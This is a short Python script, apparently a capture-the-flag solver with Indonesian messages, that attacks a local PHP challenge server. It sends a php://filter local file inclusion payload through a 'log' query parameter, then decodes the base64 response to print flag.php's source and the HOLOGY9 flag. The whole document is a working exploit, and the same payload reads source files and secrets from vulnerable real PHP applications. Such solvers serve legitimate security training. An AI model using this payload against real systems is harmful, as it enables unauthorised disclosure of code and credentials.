import requests
import base64
import re

URL = "http://localhost:3920"

def solve():
    print("[+] Exploiting...")


    payload = "php://filter/read=convert.base64-encode/resource=flag"

    print(f"[+] Mengirim Payload: {payload}")

    try:
        response = requests.get(f"{URL}/?log={payload}")


        matches = re.findall(r'([A-Za-z0-9+/]{20,}={0,2})', response.text)

        found = False
        for match in matches:
            try:
                decoded = base64.b64decode(match).decode('utf-8')
                if "SECRET_FLAG" in decoded or "HOLOGY9{" in decoded:
                    print("\n[+] SUCCESS! Source code flag.php berhasil dibaca:")
                    print("-" * 30)
                    print(decoded.strip())
                    print("-" * 30)

                    flag_match = re.search(r'(HOLOGY9\{.*?\})', decoded)
                    if flag_match:
                        print(f"[+] FLAG: {flag_match.group(1)}")
                    found = True
                    break
            except:
                continue

        if not found:
            print("[-] Gagal mengekstrak atau decode Base64.")
            print("[Debug] Response text:", response.text)

    except Exception as e:
        print(f"[-] Terjadi kesalahan: {e}")

if __name__ == "__main__":
    solve()
